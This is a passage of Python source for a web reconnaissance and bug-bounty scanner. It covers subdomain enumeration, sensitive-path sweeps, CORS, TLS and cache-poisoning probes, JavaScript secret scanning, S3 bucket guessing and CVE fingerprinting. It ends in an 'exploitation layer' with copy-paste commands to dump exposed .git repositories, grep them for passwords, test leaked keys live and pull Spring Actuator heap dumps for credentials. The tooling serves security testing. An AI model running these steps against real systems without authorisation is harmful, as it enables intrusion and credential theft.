    return subs

def enum_subdomains_securitytrails(domain: str, api_key: str) -> set:
    subs = set()
    if not api_key: return subs
    try:
        status, _, body = http_get(f"https://api.securitytrails.com/v1/domain/{domain}/subdomains",headers={"APIKEY":api_key},timeout=15)
        if status == 200:
            for s in json.loads(body).get("subdomains",[]): subs.add(f"{s}.{domain}")
    except Exception: pass
    return subs

def enum_subdomains(domain: str, api_key: str = "") -> list:
    console.print("  → crt.sh + HackerTarget + AlienVault + Anubis + RapidDNS")
    subs = enum_subdomains_crtsh(domain) | enum_subdomains_hackertarget(domain) | \
           enum_subdomains_alienvault(domain) | enum_subdomains_anubis(domain) | \
           enum_subdomains_rapiddns(domain)
    if api_key:
        subs |= enum_subdomains_securitytrails(domain, api_key)
    if domain not in subs: subs.add(domain)
    console.print(f"  Found {len(subs)} subdomain(s)")
    return sorted(subs)

def _resolve_one(host: str) -> dict:
    rec = {"A":[],"CNAME":[],"MX":[],"live":False}
    try:
        if HAS_DNS:
            for rtype in ("A","CNAME","MX"):
                try:
                    for r in dns.resolver.resolve(host, rtype): rec[rtype].append(str(r))
                    if rtype == "A": rec["live"] = True
                except Exception: pass
        else:
            ip = socket.gethostbyname(host)
            rec["A"].append(ip); rec["live"] = True
    except Exception: pass
    return rec

def resolve_dns(hosts: list) -> dict:
    results = threaded_map(_resolve_one, hosts, label="dns")
    return {host: rec for host, rec in results if rec is not None}

def check_dns_takeover(host: str, cnames: list) -> Optional[dict]:
    for cname in cnames:
        for svc, fingerprint in TAKEOVER_FINGERPRINTS.items():
            if svc in cname:
                try:
                    _, _, body = http_get(f"https://{host}", timeout=8)
                    if fingerprint.lower() in body.decode("utf-8","replace").lower():
                        return {"host":host,"cname":cname,"service":svc,"fingerprint":fingerprint,"command":f'curl -si "https://{host}"'}
                except Exception: pass
    return None

def _check_live_one(host: str):
    for scheme in ("https","http"):
        url = f"{scheme}://{host}"
        try:
            status, hdrs, body = http_get(url, follow=True, timeout=8)
            h = norm_headers(hdrs)
            return {"host":host,"url":url,"status":status,"server":h.get("server",""),
                    "powered_by":h.get("x-powered-by",""),"redirect":h.get("location","")}
        except Exception:
            continue
    return None

def check_live(hosts: list) -> list:
    results = threaded_map(_check_live_one, hosts, label="live")
    return [r for _, r in results if r]

def _sweep_one(base_url: str, path: str):
    url = base_url.rstrip("/") + path
    try:
        status, hdrs, body = http_get(url, follow=False, timeout=8)
        h = norm_headers(hdrs); ct = h.get("content-type","")
        if status == 200 and not is_html(ct, body):
            body_text = body[:300].decode("utf-8","replace")
            if len(body_text.strip()) < 5: return ("pass", f"{url} → 200 (empty)")
            if path.startswith("/.git/HEAD") and not body_text.startswith("ref:"): return ("pass", f"{url} → 200 (not git)")
            if path.startswith("/.git/config") and "[core]" not in body_text: return ("pass", f"{url} → 200 (not git)")
            if path.startswith("/.env") and ("=" not in body_text or "{" in body_text[:50]): return ("pass", f"{url} → 200 (not env)")
            return ("find", {"url":url,"status":status,"content_type":ct,
                             "snippet":body_text.replace("\n"," ").strip()[:180],
                             "command":f'curl -si --noproxy "*" "{url}"'})
        elif status in (401,403):
            is_waf, _ = is_waf_challenge(status, hdrs, body)
            return ("pass", f"{url} → {status}" + (" (WAF block)" if is_waf else " (auth/blocked)"))
        else:
            return ("pass", f"{url} → {status}")
    except Exception:
        return ("pass", f"{url} → error")

def sweep_endpoints(base_url: str) -> tuple:
    findings, passed = [], []
    results = threaded_map(lambda p: _sweep_one(base_url, p), SENSITIVE_PATHS, label="sweep")
    for _, res in results:
        if not res: continue
        kind, val = res
        (findings if kind == "find" else passed).append(val)
    return findings, passed

def check_headers(base_url: str) -> tuple:
    findings, passed = [], []
    try:
        status, hdrs, _ = http_get(base_url, timeout=8)
        h = norm_headers(hdrs)
        for hdr, (sev, impact) in REQUIRED_HEADERS.items():
            val = h.get(hdr,"")
            if not val:
                findings.append({"severity":sev,"header":hdr,"url":base_url,"evidence":f"Header '{hdr}' missing | Impact: {impact}","command":f'curl -sI "{base_url}"',"remediation":"Add via Cloudflare Transform Rule or web server config"})
            else:
                passed.append(f"{hdr}: {val[:60]}")
        # CSP analysis
        csp = h.get("content-security-policy","")
        if csp:
            directives = {}
            for part in csp.split(";"):
                tokens = part.strip().split()
                if tokens: directives[tokens[0].lower()] = tokens[1:]
            script_vals = directives.get("script-src", directives.get("default-src",[]))
            has_nonce = any("nonce-" in v for v in script_vals) or "'strict-dynamic'" in csp
            if "'unsafe-eval'" in script_vals:
                findings.append({"severity":"Low" if has_nonce else "Medium","header":"CSP-unsafe-eval","url":base_url,"evidence":f"unsafe-eval in script-src","command":f'curl -sI "{base_url}"',"remediation":"Remove unsafe-eval; use wasm-unsafe-eval for WASM"})
            if "'unsafe-inline'" in script_vals and not has_nonce:
                findings.append({"severity":"Medium","header":"CSP-unsafe-inline","url":base_url,"evidence":"unsafe-inline without nonce in script-src","command":f'curl -sI "{base_url}"',"remediation":"Use nonces or hashes instead of unsafe-inline"})
        server = h.get("server","")
        if server and any(c.isdigit() for c in server):
            findings.append({"severity":"Low","header":"server-version","url":base_url,"evidence":f"Server: {server}","command":f'curl -sI "{base_url}"',"remediation":"Strip version from Server header"})
    except Exception as e:
        passed.append(f"Header check error: {e}")
    return findings, passed

def check_tls(host: str) -> tuple:
    findings, passed = [], []
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host,443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as s:
                cert = s.getpeercert()
                not_after = cert.get("notAfter","")
                if not_after:
                    exp = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                    days = (exp - datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None)).days
                    if days < 30:
                        findings.append({"severity":"High","check":"cert-expiry","host":host,"detail":f"Certificate expires in {days} days","command":f"echo | openssl s_client -connect {host}:443 2>/dev/null | openssl x509 -noout -dates"})
                    else:
                        passed.append(f"TLS cert valid {days} days")
                cipher = s.cipher()
                passed.append(f"Cipher: {cipher[0]}/{cipher[1]}")
                if cipher[0] and any(w in cipher[0].upper() for w in ["RC4","DES","NULL","EXPORT","MD5"]):
                    findings.append({"severity":"High","check":"weak-cipher","host":host,"detail":f"Weak cipher: {cipher[0]}","command":"","remediation":"Disable weak ciphers"})
    except Exception as e:
        passed.append(f"TLS error: {e}")
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        for ver_name, attr in [("TLS 1.0","TLSv1"),("TLS 1.1","TLSv1_1")]:
            ver = getattr(ssl.TLSVersion, attr, None)
            if ver is None: passed.append(f"{ver_name}: not testable"); continue
            try:
                ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx2.check_hostname = False; ctx2.verify_mode = ssl.CERT_NONE
                ctx2.minimum_version = ver; ctx2.maximum_version = ver
                with socket.create_connection((host,443), timeout=8) as sock:
                    with ctx2.wrap_socket(sock, server_hostname=host):
                        findings.append({"severity":"High","check":"legacy-tls","host":host,"detail":f"{host} accepts {ver_name}","command":f"openssl s_client -connect {host}:443 -{attr.lower()}","remediation":"Set min TLS to 1.2"})
            except ssl.SSLError: passed.append(f"{ver_name}: rejected ✓")
            except Exception as e: passed.append(f"{ver_name}: {e}")
    return findings, passed

def check_cors(base_url: str, test_origins: list) -> list:
    findings = []
    for origin in test_origins:
        try:
            _, hdrs, _ = http_get(base_url, headers={"Origin": origin}, timeout=8)
            h = norm_headers(hdrs)
            acao = h.get("access-control-allow-origin","")
            acac = h.get("access-control-allow-credentials","")
            if acao == "*":
                findings.append({"origin":origin,"severity":"Info","url":base_url,"evidence":f"ACAO: *","command":f'curl -si -H "Origin: {origin}" "{base_url}"',"remediation":"Restrict origins if sensitive data returned"})
            elif origin in acao and "true" in acac.lower():
                findings.append({"origin":origin,"severity":"High","url":base_url,"evidence":f"ACAO: {acao} | ACAC: {acac}","command":f'curl -si -H "Origin: {origin}" "{base_url}"',"remediation":"Remove Allow-Credentials or use token auth"})
            elif origin in acao:
                findings.append({"origin":origin,"severity":"Low","url":base_url,"evidence":f"ACAO: {acao}","command":f'curl -si -H "Origin: {origin}" "{base_url}"',"remediation":"Restrict to known origins"})
        except Exception: pass
    return findings

def check_exposures(base_url: str) -> list:
    findings = []
    checks = [
        ("/.well-known/jwks.json","Info","JWKS endpoint exposed"),
        ("/.well-known/openid-configuration","Info","OIDC config exposed"),
        ("/main.js.map","Medium","Webpack source map exposed"),
        ("/app.js.map","Medium","Webpack source map exposed"),
        ("/.git/HEAD","Critical","Git HEAD exposed"),
        ("/.git/config","Critical","Git config exposed"),
    ]
    for path, sev, title in checks:
        url = base_url.rstrip("/") + path
        try:
            status, hdrs, body = http_get(url, follow=False, timeout=8)
            h = norm_headers(hdrs); ct = h.get("content-type","")
            if status == 200 and not is_html(ct, body):
                body_text = body[:300].decode("utf-8","replace")
                if path == "/.git/HEAD" and not body_text.startswith("ref:"): continue
                if path == "/.git/config" and "[core]" not in body_text: continue
                if len(body_text.strip()) == 0: continue
                findings.append({"severity":sev,"title":title,"url":url,"content_type":ct,"snippet":body_text.replace("\n"," ").strip()[:150],"command":f'curl -si "{url}"',"remediation":"Block at WAF or remove from webroot"})
        except Exception: pass
    return findings

def collect_js_urls(base_url: str) -> tuple:
    js_urls, routes = set(), set()
    try:
        _, _, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8","replace")
        for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', text):
            src = m.group(1)
            if src.startswith("http"): js_urls.add(src)
            elif src.startswith("//"): js_urls.add("https:"+src)
            elif src.startswith("/"): js_urls.add(f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}{src}")
        nxt_routes, nxt_chunks = extract_nextjs_routes_and_chunks(base_url, text)
        routes.update(nxt_routes); js_urls.update(nxt_chunks)
    except Exception: pass
    return sorted(list(js_urls))[:60], sorted(list(routes))

def scan_js_secrets(js_url: str) -> tuple:
    secrets, endpoints = [], []
    try:
        status, _, body = http_get(js_url, timeout=10)
        if status != 200: return secrets, endpoints
        text = body.decode("utf-8","replace")
        endpoints = extract_endpoints_from_js(text)
        for name, pattern in JS_SECRET_PATTERNS.items():
            matches = re.findall(pattern, text)
            if not matches: continue

            if name == "Password in URL":
                matches = [m for m in matches if is_valid_secret_url(m)]
                if not matches: continue
                sample = mask_url_password(matches[0])
            else:
                sample = _longest_token(matches[0])[:60]

            # JWT: emit only the structured crypto findings — no duplicate generic row.
            if name == "JWT Token":
                for token_match in matches[:3]:
                    for jf in audit_jwt_token(_longest_token(token_match), js_url):
                        secrets.append({
                            "severity":jf["severity"],"type":jf.get("type","jwt"),
                            "url":js_url,"detail":jf.get("title","JWT issue"),
                            "sample":_longest_token(token_match)[:40]+"...","command":jf.get("command",""),
                            "remediation":jf.get("remediation","Rotate token")
                        })
                continue

            # Entropy gate for FP-prone patterns: a low-randomness match (e.g. a
            # repeated placeholder in minified JS) is dropped rather than reported.
            if name in ENTROPY_GATED:
                token = _longest_token(matches[0])
                core = re.sub(r'^(sk-|AIza|Bearer\s+)', '', token, flags=re.I)
                if shannon_entropy(core) < 3.2:
                    continue

            sev = SECRET_SEVERITY.get(name, "Medium")
            secrets.append({"severity":sev,
                "type":name,"url":js_url,"detail":f"{len(matches)} match(es) of '{name}'","sample":sample,
                "command":f'curl -s "{js_url}" | grep -aEo "{pattern[:40]}"',
                "remediation":"Verify the key is live, then rotate it and remove from client-side code"})
    except Exception: pass
    return secrets, endpoints

def check_s3_buckets(domain: str) -> list:
    findings = []
    base = domain.split(".")[0]
    parts = [base, domain.replace(".","-"), domain.replace(".","")]
    prefixes = ["","dev-","staging-","prod-","backup-","data-","assets-","media-","static-","files-","uploads-","logs-"]
    buckets = set()
    for p in parts:
        for pref in prefixes:
            buckets.add(f"{pref}{p}")
            if pref: buckets.add(f"{p}-{pref.rstrip('-')}")
    for bucket in list(buckets)[:25]:
        for endpoint in [
            f"https://{bucket}.s3.amazonaws.com",
            f"https://storage.googleapis.com/{bucket}",
        ]:
            try:
                status, _, body = http_get(endpoint, timeout=5)
                snippet = body[:200].decode("utf-8","replace")
                if status == 200:
                    findings.append({"severity":"Critical","bucket":bucket,"detail":f"Cloud storage publicly readable: {bucket}","snippet":snippet[:100],"command":f'curl -si "{endpoint}"',"remediation":"Set bucket ACL to private"})
                elif status == 403:
                    findings.append({"severity":"Info","bucket":bucket,"detail":f"Bucket exists but private: {bucket}","command":f'curl -si "{endpoint}"'})
            except Exception: pass
    return findings

def run_nuclei(target: str, out_dir: Path) -> list:
    findings = []
    nuclei_path = subprocess.run(["which","nuclei"], capture_output=True, text=True).stdout.strip()
    if not nuclei_path:
        return [{"error":"nuclei not found — install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}]
    out_file = out_dir / "nuclei_output.jsonl"
    # OAST (interactsh) left ENABLED — it powers nuclei's blind SSRF/RCE/OOB
    # templates, which are among its highest-value checks. The old code passed
    # -no-interactsh, silently disabling all of them.
    cmd = [nuclei_path, "-u", target,"-tags","misconfig,exposure,config,headers,ssl,file,token,generic",
           "-severity","critical,high,medium,low,info","-jsonl","-o",str(out_file),"-silent",
           "-rl",str(int(HTTP_CFG["rate"]) or 50),"-c",str(HTTP_CFG["threads"])]
    try:
        subprocess.run(cmd, timeout=240, capture_output=True)
        if out_file.exists():
            for line in out_file.read_text().splitlines():
                try:
                    n = json.loads(line)
                    findings.append({"severity":n.get("info",{}).get("severity","info").capitalize(),
                        "category":"nuclei","title":n.get("info",{}).get("name","nuclei finding"),
                        "url":n.get("matched-at",target),"detail":n.get("info",{}).get("description",""),
                        "command":f"nuclei -u {target} -id {n.get('template-id','')}",
                        "remediation":n.get("info",{}).get("remediation","")})
                except Exception: pass
    except subprocess.TimeoutExpired:
        findings.append({"error":"nuclei timed out (240s)"})
    except Exception as e:
        findings.append({"error":str(e)})
    return findings

def parse_dalfox_output(text: str, min_confidence: float = 0.8) -> list:
    findings = []
    block_re = re.compile(r'\((\d+)\)\s+(\S+)\s+\[(\w+)\]\s*\n.*?url\s*:\s*(\S+)\s*\n.*?context\s*:\s*(\S+)\s*\n.*?payload\s*:\s*(.+?)\s*\n.*?confidence\s*:\s*([\d.]+)', re.DOTALL)
    by_param: dict = {}
    for m in block_re.finditer(text):
        idx, param, method, url, ctx, payload, conf_str = m.groups()
        try: conf = float(conf_str)
        except: conf = 0.0
        if conf < min_confidence: continue
        key = param.lower()
        if key not in by_param:
            by_param[key] = {"param":param,"method":method,"url":url,"context":ctx,"confidence":conf,"payloads":[],"poc_urls":[]}
        by_param[key]["payloads"].append(payload.strip())
        by_param[key]["confidence"] = max(by_param[key]["confidence"], conf)
    for key, info in by_param.items():
        conf = info["confidence"]
        sev = "High" if conf >= 1.4 else ("Medium" if conf >= 1.0 else "Low")
        findings.append({"severity":sev,"category":"xss-dalfox","title":f"DOM XSS — param '{info['param']}' [{info['method']}] (conf {conf:.2f})",
            "url":info["url"].split("?")[0],"evidence":f"Parameter: {info['param']} | Payloads: {len(info['payloads'])} | Sample: {info['payloads'][0][:120]}",
            "command":f"# PoC: {info['poc_urls'][0] if info['poc_urls'] else info['url']}",
            "remediation":"Sanitise param values before DOM insertion; use textContent; enforce strict CSP"})
    return findings

def parse_nuclei_jsonl(text: str) -> list:
    findings, seen = [], set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        try: n = json.loads(line)
        except: continue
        tid = n.get("template-id",""); murl = n.get("matched-at","")
        key = f"{tid}:{murl}"
        if key in seen: continue
        seen.add(key)
        info = n.get("info",{}); sev = info.get("severity","info").capitalize()
        findings.append({"severity":sev,"category":"nuclei","title":info.get("name",tid),"url":murl,
            "evidence":info.get("description","")[:200],"command":f"nuclei -u {murl.split('?')[0]} -id {tid}",
            "remediation":info.get("remediation","")})
    return findings

def _norm_body(raw: bytes) -> str:
    """Letters-only, lowercased, length-capped signature of a body.
    Two responses with the same signature are the 'same page' regardless of the
    path echoed into them — this is how we detect SPA / catch-all responses."""
    txt = raw[:8000].decode("utf-8", errors="replace").lower()
    return re.sub(r"[^a-z]", "", txt)[:2000]

_ERROR_BODY_RE = re.compile(
    r'("status(code)?"\s*:\s*[45]\d\d|'          # {"statuscode":404 ...}
    r'"error"\s*:\s*(true|"not\s*found")|'        # {"error":"not found"}
    r'\b404\b.{0,15}not\s*found|'                 # 404 Not Found
    r'page\s+not\s+found|'
    r'\bnginx\b.{0,40}(not\s*found|bad\s*gateway|forbidden))', re.I)

def check_cve_fingerprints(base_url: str) -> list:
    """Fingerprint known-vulnerable products — with aggressive FP suppression.

    Kills the three classic false positives: (1) catch-all 404 JSON/HTML that
    echoes the requested path (so '/moveit/' 'matches' 'MOVEit'); (2) SPA index
    served for every path; (3) weak keywords matching as substrings ('nable' in
    'enable'). We only flag when a REAL product page answers — not an error page."""
    findings = []
    base = base_url.rstrip("/")

    # ── per-host baseline: hit a random path to learn the catch-all response ──
    rnd = "/zz" + "".join(random.choices(string.ascii_lowercase, k=14)) + "zz"
    base_status, base_sig = None, None
    try:
        bs, _bh, bb = http_get(base + rnd, follow=False, timeout=8)
        base_status, base_sig = bs, _norm_body(bb)
    except Exception:
        pass

    for check in CVE_CHECKS:
        hit = None
        for path in check["paths"]:
            url = base + path
            try:
                status, hdrs, body = http_get(url, follow=False, timeout=8)
            except Exception:
                continue

            # 1) reject hard error / not-found statuses outright
            if status in (404, 410) or status >= 500:
                continue

            decoded = body[:8000].decode("utf-8", errors="replace").lower()
            sig = _norm_body(body)

            # 2) reject catch-all: same body signature as the random baseline
            if base_sig and sig == base_sig and (base_status is None or status == base_status):
                continue
            # 3) reject bodies that announce themselves as errors / not-found
            if _ERROR_BODY_RE.search(decoded):
                continue

            # 4) strip the echoed request path so path-echo can't match keywords
            variants = {path.lower(), unquote(path).lower()}
            variants |= {seg for p in list(variants) for seg in re.split(r"[/_.\-]", p) if len(seg) > 3}
            stripped = decoded
            for v in sorted(variants, key=len, reverse=True):
                if v:
                    stripped = stripped.replace(v, " ")
            h = norm_headers(hdrs)
            header_str = " ".join(f"{k}: {v}" for k, v in h.items()).lower()
            text = stripped + " " + header_str

            # 5) match keywords with word boundaries (no substring bleed)
            for keyword in check["match"]:
                k = keyword.lower()
                if re.search(r"(?<![a-z0-9])" + re.escape(k) + r"(?![a-z0-9])", text):
                    snippet = decoded[:200].replace("\n", " ").strip()
                    hit = (url, keyword, snippet, status)
                    break
            if hit:
                break

        if hit:
            url, matched_on, matched_body, status = hit
            findings.append({"severity": check["severity"], "category": "cve-fingerprint",
                "title": f"{check['cve']} — {check['product']}", "url": url,
                "evidence": (f"Fingerprint '{matched_on}' in a live {status} response "
                             f"(not a 404/catch-all). Body: {matched_body[:150]}"),
                "command": f'curl -si "{url}"', "remediation": check["remediation"]})
    return findings

# ── NEW (v4.0): Cache-poisoning / Host-override reflection ────────────────────
CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host",   "cachepoison.example.com"),
    ("X-Host",             "cachepoison.example.com"),
    ("X-Forwarded-Server", "cachepoison.example.com"),
    ("X-Forwarded-Scheme", "nothttps"),
]

def detect_cache_poisoning(base_url: str) -> list:
    """Probe for unkeyed-header reflection (classic web-cache-poisoning primitive).

    A random cache-buster query string is added so OUR probe keys to a unique
    URL and cannot poison the cache entry real users receive. We only report a
    High when the injected value reflects AND the response looks cacheable."""
    findings = []
    marker = "cachepoison.example.com"
    cb = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    probe_url = base_url + ("&" if "?" in base_url else "?") + f"cb={cb}"
    try:
        for hdr, val in CACHE_POISON_HEADERS:
            try:
                st, h, b = http_get(probe_url, headers={hdr: val}, timeout=8)
            except Exception:
                continue
            h = norm_headers(h)
            body_head = b[:6000].decode("utf-8", "replace")
            mark = marker if hdr != "X-Forwarded-Scheme" else "nothttps"
            if mark in body_head or mark in h.get("location", ""):
                xcache = h.get("x-cache", "").lower()
                cacheable = bool(h.get("age") or "public" in h.get("cache-control", "").lower()
                                 or "hit" in xcache or "miss" in xcache)
                sev = "High" if cacheable else "Low"
                findings.append({
                    "severity": sev, "category": "cache-poison",
                    "title": f"Host/scheme override reflected via {hdr}"
                             + (" (response cacheable)" if cacheable else " (no cache signal)"),
                    "url": base_url,
                    "evidence": (f"Injected {hdr}: {val} → reflected in response. "
                                 f"Cache signals: X-Cache='{h.get('x-cache','')}' Age='{h.get('age','')}' "
                                 f"Cache-Control='{h.get('cache-control','')[:60]}'"),
                    "command": f'curl -si -H "{hdr}: {val}" "{base_url}"',
                    "remediation": ("Do not reflect Host / X-Forwarded-Host into HTML or absolute URLs; "
                                    "strip these headers at the edge or exclude them from the cache key."),
                })
    except Exception:
        pass
    return findings

# ── NEW (v4.0): retire.js-lite — outdated front-end library detection ─────────
JS_LIB_VERSION_PATTERNS = {
    "jQuery":    (r'jquery[.\-/]?v?(\d+\.\d+\.\d+)', "3.5.0",
                  "DOM XSS via htmlPrefilter (CVE-2020-11022/11023), fixed in 3.5.0"),
    "lodash":    (r'lodash[.\-/]?v?(\d+\.\d+\.\d+)', "4.17.21",
                  "Prototype pollution (CVE-2020-8203 / 2021-23337), fixed in 4.17.21"),
    "AngularJS": (r'angular[.\-/]?v?(1\.\d+\.\d+)', "1.8.3",
                  "Legacy AngularJS 1.x — repeated sandbox-escape XSS; migrate off 1.x"),
    "Bootstrap": (r'bootstrap[.\-/]?v?(\d+\.\d+\.\d+)', "4.3.1",
                  "XSS in data-target / tooltips (CVE-2019-8331), fixed in 4.3.1 / 3.4.1"),
    "Moment.js": (r'moment[.\-/]?v?(\d+\.\d+\.\d+)', "2.29.4",
                  "ReDoS / path traversal (CVE-2022-24785 / 2022-31129), fixed in 2.29.4"),
}

def _ver_tuple(v: str):
    return tuple(int(x) for x in v.split(".")[:3])

def detect_js_lib_versions(base_url: str, extra_text: str = "") -> list:
    findings, seen = [], set()
    text = extra_text
    try:
        _, _, body = http_get(base_url, timeout=8)
        text = body.decode("utf-8", "replace") + " " + extra_text
    except Exception:
        pass
    for lib, (pat, fixed, note) in JS_LIB_VERSION_PATTERNS.items():
        m = re.search(pat, text, re.I)
        if not m:
            continue
        ver = m.group(1)
        if lib in seen:
            continue
        try:
            outdated = _ver_tuple(ver) < _ver_tuple(fixed)
        except Exception:
            continue
        if outdated:
            seen.add(lib)
            findings.append({
                "severity": "Medium", "category": "outdated-lib",
                "title": f"Outdated {lib} {ver} (< {fixed})", "url": base_url,
                "evidence": f"{lib} {ver} detected — {note}",
                "command": f'curl -s "{base_url}" | grep -iEo "{lib.lower()}[.\\-/]?v?[0-9.]+"',
                "remediation": f"Upgrade {lib} to >= {fixed}.",
            })
    return findings

# ── NEW: ASCII severity bar chart ─────────────────────────────────────────────
def print_ascii_chart(findings: list):
    counts = {}
    for f in findings:
        s = f.get("severity","Info")
        counts[s] = counts.get(s,0) + 1
    total = max(len(findings), 1)
    bar_max = 30
    print("\n📊 Severity Distribution")
    print("─" * 50)
    for sev in ["Critical","High","Medium","Low","Info"]:
        c = counts.get(sev, 0)
        bar_len = int((c / total) * bar_max)
        bar = "█" * bar_len
        em = SEV_EMOJI.get(sev,"⚪")
        print(f"  {em} {sev:<10} {bar:<30} {c}")
    print("─" * 50)

# ── Report generation ─────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  EXPLOITATION LAYER — turn a raw finding into something reportable
#  For each finding: a report VERDICT + concrete exploitation/PoC steps + impact.
#  Verdicts:  yes    = exploitable, demonstrable impact (worth a report)
#             manual = real only if you prove concrete impact by hand first
#             no     = hardening/informational, NOT a standalone bounty report
# ══════════════════════════════════════════════════════════════════════════════
VERDICT_LABEL = {"yes":"✅ EXPLOITABLE", "manual":"🔶 NEEDS MANUAL PROOF",
                 "no":"⛔ NOT REPORTABLE ALONE"}

# ── Framework mapping (inspired by BitterSecurity/Decepticon's recon-methodology,
#    Apache-2.0; the referenced frameworks — MITRE ATT&CK, OWASP Top 10 / WSTG —
#    are public standards). Tagging findings to recognised frameworks is what makes
#    a report read as professional to a triager. ────────────────────────────────
FRAMEWORK_MAP = {
    "ssrf":                ("T1190 Exploit Public-Facing App", "A10:2021 SSRF",                    "WSTG-INPV-19"),
    "idor":                ("T1190 Exploit Public-Facing App", "A01:2021 Broken Access Control",   "WSTG-ATHZ-04"),
    "xss":                 ("T1059 Command & Scripting",        "A03:2021 Injection",               "WSTG-CLNT-01"),
    "xss-dalfox":          ("T1059 Command & Scripting",        "A03:2021 Injection",               "WSTG-CLNT-01"),
    "ssti":                ("T1190 Exploit Public-Facing App",  "A03:2021 Injection",               "WSTG-INPV-18"),
    "sqli":                ("T1190 Exploit Public-Facing App",  "A03:2021 Injection",               "WSTG-INPV-05"),
    "lfi":                 ("T1083 File & Directory Discovery", "A01:2021 Broken Access Control",   "WSTG-ATHZ-01"),
    "xxe":                 ("T1190 Exploit Public-Facing App",  "A05:2021 Security Misconfig",      "WSTG-INPV-07"),
    "open-redirect":       ("T1190 Exploit Public-Facing App",  "A01:2021 Broken Access Control",   "WSTG-CLNT-04"),
    "cors":                ("T1190 Exploit Public-Facing App",  "A05:2021 Security Misconfig",      "WSTG-CLNT-07"),
    "headers":             ("—",                                "A05:2021 Security Misconfig",      "WSTG-CONF-01"),
    "cve-fingerprint":     ("T1595.002 Vulnerability Scanning", "A06:2021 Vulnerable Components",   "WSTG-INFO-09"),
    "outdated-lib":        ("T1595.002 Vulnerability Scanning", "A06:2021 Vulnerable Components",   "WSTG-INFO-09"),
    "cache-poison":        ("T1190 Exploit Public-Facing App",  "A05:2021 Security Misconfig",      "WSTG-INPV-19"),
    "graphql":             ("T1190 Exploit Public-Facing App",  "API8:2023 Security Misconfig",     "WSTG-APIT-01"),
    "jwt":                 ("T1550 Use Alternate Auth Material","A07:2021 Auth Failures",           "WSTG-SESS-01"),
    "dns-takeover":        ("T1584.001 Compromise Domains",     "A05:2021 Security Misconfig",      "WSTG-CONF-10"),
    "s3":                  ("T1530 Data from Cloud Storage",    "A05:2021 Security Misconfig",      "WSTG-CONF-11"),
    "exposure":            ("T1592 Gather Victim Host Info",    "A05:2021 Security Misconfig",      "WSTG-CONF-04"),
    "tls":                 ("—",                                "A02:2021 Cryptographic Failures",  "WSTG-CRYP-01"),
    "dns-sec":             ("T1590 Gather Victim Network Info", "A05:2021 Security Misconfig",      "WSTG-INFO-02"),
    "cookies":             ("T1539 Steal Web Session Cookie",   "A07:2021 Auth Failures",           "WSTG-SESS-02"),
    "waf":                 ("T1590 Gather Victim Network Info", "—",                                "WSTG-INFO-10"),
    "idn-homoglyph":       ("T1583.001 Acquire Domains",        "—",                                "WSTG-CLNT-04"),
    "prototype-pollution": ("T1059 Command & Scripting",        "A03:2021 Injection",               "WSTG-INPV-11"),
    "race-condition":      ("T1190 Exploit Public-Facing App",  "A04:2021 Insecure Design",         "WSTG-BUSL-13"),
    "js-secrets":          ("T1552 Unsecured Credentials",      "A05:2021 Security Misconfig",      "WSTG-CONF-04"),
    "github":              ("T1593.003 Search Open Websites",   "A05:2021 Security Misconfig",      "WSTG-INFO-05"),
}

def framework_for(category: str) -> dict:
    """Map a finding category to MITRE ATT&CK / OWASP Top-10 / OWASP WSTG tags."""
    mitre, owasp, wstg = FRAMEWORK_MAP.get((category or "").lower(),
        ("T1595 Active Scanning", "—", "WSTG-INFO-01"))
    return {"mitre": mitre, "owasp": owasp, "wstg": wstg}

def _exp(verdict, impact, steps, poc=None):
    return {"verdict": verdict, "impact": impact, "steps": steps, "poc": poc}

def exploitation_for(f: dict, domain: str) -> dict:
    """Return an exploitation plan for a finding. Steps are copy-paste ready and
    scoped to the finding's own URL — this is what you actually put in a report."""
    cat  = (f.get("category") or "").lower()
    url  = f.get("url") or f.get("host") or f"https://{domain}"
    ev   = (f.get("evidence") or f.get("snippet") or "").lower()
    path = urlparse(url).path.lower() if "://" in url else ""
    host = urlparse(url).netloc or domain

    # ── Exposures: branch on exactly what is exposed ──────────────────────────
    if cat == "exposure":
        if f.get("severity") == "Info" or path in BENIGN_PATHS:
            return _exp("no", "Public/benign file — informational only, not a standalone bounty.",
                ["Do not submit. Note it only as context (e.g. a path in robots.txt that reveals a hidden endpoint worth testing)."])
        if ".git" in path:
            return _exp("yes", "Full source-code & secret disclosure (often creds/keys in history).",
                [f'git-dumper {url.rsplit("/.git",1)[0]}/.git/ loot/   # or: wget -r {url}',
                 "cd loot && git log -p | grep -iE \"password|secret|api[_-]?key|token\"",
                 "Recover removed files: git checkout -- . ; review config/.env in history"])
        if ".env" in path:
            return _exp("yes", "Credential/API-key disclosure → pivot to the services those creds unlock.",
                [f'curl -s "{url}"',
                 "Extract KEY=VALUE pairs; validate each live key (AWS: aws sts get-caller-identity, etc.)",
                 "Report the leak AND any access the keys granted (that is the real impact)."])
        if "/metrics" in path:
            return _exp("manual", "Internal telemetry disclosure. Only report if it leaks internal "
                                  "hostnames, routes, tenant/user counts, or versions — raw counters alone are weak.",
                [f'curl -s "{url}" | grep -iE "host|url|route|path|target|addr|version|email" | sort -u',
                 "Screenshot any internal hostname / private IP / route it reveals.",
                 "Chain: if a Prometheus pushgateway, test unauth metric injection."])
        if "actuator" in path:
            return _exp("yes", "Spring Actuator: env secrets, heap dump with credentials, sometimes RCE via jolokia.",
                [f'curl -s "{url.rsplit("/actuator",1)[0]}/actuator/env" | jq . | grep -i "pass\\|secret\\|key"',
                 f'curl -s "{url.rsplit("/actuator",1)[0]}/actuator/heapdump" -o heap.bin && strings heap.bin | grep -i password',
                 "If /actuator/jolokia present: attempt MBean RCE (well-documented chain)."])
        if "swagger" in path or "openapi" in path or "/graphql" in path:
            return _exp("manual", "API surface disclosure → hunt broken-auth/IDOR on the documented routes.",
                [f'Open {url} and import the spec into Postman/Burp.',
